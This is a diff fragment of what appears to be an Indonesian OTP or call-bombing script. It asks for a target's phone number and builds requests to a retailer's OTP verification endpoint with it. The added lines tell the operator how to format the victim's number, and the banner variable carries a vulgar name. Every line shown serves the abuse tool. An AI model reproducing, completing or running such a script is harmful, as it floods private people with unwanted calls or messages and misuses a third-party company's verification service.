@@ -10,7 +10,8 @@ ngentot = """
 """
 os.system('clear')
 print(ngentot)
-
+print(' {+} Note!! Usahakan Kamu hapus nomor 0nya')
+print(' {+} Contoh : 8xxxx \n')
 target = input(" Target Call : ")
 
 api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target
